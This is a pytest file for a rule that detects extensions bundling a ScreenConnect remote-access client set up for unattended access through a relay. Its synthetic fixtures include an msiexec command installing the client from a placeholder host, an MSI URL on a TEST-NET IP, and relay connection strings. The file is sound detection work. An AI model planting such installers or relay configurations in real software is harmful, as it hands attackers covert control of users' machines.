"""Fire / silent / FP-guard tests for the S20 RMM remote-access (BYOSC) rule.

Inputs are SYNTHETIC — they reproduce the *shape* of the `snowshono` /
`trailofbits/vsix-zoo` ScreenConnect-MSI BYOSC campaign (a remote-access client
referenced with an unattended-access relay configuration) using only RFC 5737
TEST-NET IPs (``192.0.2.0/24`` / ``198.51.100.0/24`` / ``203.0.113.0/24``) and
RFC 2606 placeholder hosts (``*.example.com``). No real sample, no live relay IP,
no campaign C2 enters *these tests* (see the detection-design README safety
section): ``s20`` is behaviour-based, so no IOC literal appears in the rule or its
fixtures. (The campaign's real relay hosts are carried separately in the
``blacklist_domains`` data file, matched by ``s4``/``a7`` — not by ``s20``.) The
ScreenConnect launch parameters (``e=Access&y=Guest`` / ``&h=&p=&s=&k=``) are the
product's own protocol syntax, not a sample literal.
"""

from __future__ import annotations

from collections.abc import Callable

from static_runtime.context import StaticAnalysisContext
from static_runtime.rules.s20_rmm_remote_access import RmmRemoteAccessAbuseRule

MakeContext = Callable[..., StaticAnalysisContext]


# ── Fire — the BYOSC conjunction (client ref ∧ unattended-access relay) ────────


def test_fires_high_on_install_url_with_bare_ip_relay(
    make_context: MakeContext,
) -> None:
    # The canonical BYOSC shape: an embedded ScreenConnect install URL with the
    # unattended-access launch params, pointed at a bare-IP relay → HIGH/HIGH.
    src = (
        'const u = "http://203.0.113.10:8040/Bin/'
        'ScreenConnect.ClientSetup.msi?e=Access&y=Guest";\n'
    )
    ctx = make_context(files={"extension.js": src})
    findings = RmmRemoteAccessAbuseRule().evaluate(ctx)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "extrace.s20.rmm_remote_access"
    assert finding.severity.value == "high"
    assert finding.confidence.value == "high"  # bare-IP relay booster
    assert finding.adversary_class is None
    assert "attack.T1219" in finding.categories
    assert "extrace.ext.rmm_remote_access" in finding.categories
    assert finding.evidence


def test_fires_medium_on_named_relay(make_context: MakeContext) -> None:
    # Same conjunction but a *named* host (not a bare IP): the BYOSC capability is
    # surfaced, but confidence is MEDIUM (a named relay is the legit-cousin shape).
    src = (
        'spawn("msiexec", ["/i", '
        '"https://support.example.com/Bin/ScreenConnect.ClientSetup.msi'
        '?e=Access&y=Guest"]);\n'
    )
    ctx = make_context(files={"install.js": src})
    findings = RmmRemoteAccessAbuseRule().evaluate(ctx)
    assert len(findings) == 1
    assert findings[0].confidence.value == "medium"


def test_fires_on_relay_connection_string(make_context: MakeContext) -> None:
    # The relay connection-string form (session + key) with no e=Access launch
    # params; named/no-IP so MEDIUM. Tests the _RELAY_CONNSTRING_RE branch.
    src = (
        "// ScreenConnect.ClientService launch parameters\n"
        'const cfg = "?p=8041&s=4fa6deb55b683867&k=BgIAAACkAABSU0ExAAAA";\n'
    )
    ctx = make_context(files={"config.js": src})
    findings = RmmRemoteAccessAbuseRule().evaluate(ctx)
    assert len(findings) == 1
    assert findings[0].rule_id == "extrace.s20.rmm_remote_access"
    assert findings[0].confidence.value == "medium"


def test_fires_high_on_h_param_bare_ip(make_context: MakeContext) -> None:
    # The &h=<ip>&p=<port> relay host/port pair with a bare IP → connstring match
    # + bare-IP booster → HIGH.
    src = (
        "# ConnectWise Control relay\n"
        'relay = "&h=198.51.100.7&p=8041&s=4fa6deb55b683867&k=BgIAAACkAAB"\n'
    )
    ctx = make_context(files={"relay.yml": src})
    findings = RmmRemoteAccessAbuseRule().evaluate(ctx)
    assert len(findings) == 1
    assert findings[0].confidence.value == "high"


# ── Silent — the conjunction guard (each part alone is benign) ─────────────────


def test_silent_for_screenconnect_mention_without_relay_config(
    make_context: MakeContext,
) -> None:
    # The load-bearing FP guard: a benign extension may legitimately reference the
    # ScreenConnect product (e.g. an attended remote-support integration). Without
    # an unattended-relay configuration the conjunction does not fire.
    src = (
        "// Integrates with ScreenConnect for attended remote-support sessions.\n"
        'const docs = "https://www.screenconnect.com/docs";\n'
    )
    ctx = make_context(files={"support.js": src})
    assert RmmRemoteAccessAbuseRule().evaluate(ctx) == []


def test_silent_for_unattended_params_without_client_ref(
    make_context: MakeContext,
) -> None:
    # The other half of the conjunction: an e=Access&y=Guest query string with no
    # remote-access-client reference is not the BYOSC shape and stays silent.
    src = 'const link = "https://app.example.com/launch?e=Access&y=Guest";\n'
    ctx = make_context(files={"link.js": src})
    assert RmmRemoteAccessAbuseRule().evaluate(ctx) == []


def test_silent_for_benign_query_string(make_context: MakeContext) -> None:
    # A benign API URL with key/page params (k=/s=-adjacent tokens) and no client
    # reference: neither conjunct's full shape is present.
    src = 'const api = "https://api.example.com/v1/items?sort=asc&page=2&key=abc123";\n'
    ctx = make_context(files={"api.js": src})
    assert RmmRemoteAccessAbuseRule().evaluate(ctx) == []


def test_silent_for_clean_extension(make_context: MakeContext) -> None:
    src = 'export function activate() { console.log("hello"); }\n'
    ctx = make_context(files={"extension.js": src})
    assert RmmRemoteAccessAbuseRule().evaluate(ctx) == []


def test_silent_for_config_inside_msi_binary(make_context: MakeContext) -> None:
    # Documents the known gap (spec §6): the dropped MSI's embedded config is NOT
    # parsed. A `.msi` is not a scanned text suffix, so content that *would* match
    # is invisible to this text layer — extracting h/p/s/k from the binary needs a
    # deferred MSI static parser (the binary is never opened in this repo).
    src = (
        "ScreenConnect.ClientSetup "
        "?h=203.0.113.5&p=8041&s=4fa6deb55b683867&k=BgIAAACkAAB&e=Access&y=Guest"
    )
    ctx = make_context(files={"ScreenConnect.ClientSetup.msi": src})
    assert RmmRemoteAccessAbuseRule().evaluate(ctx) == []
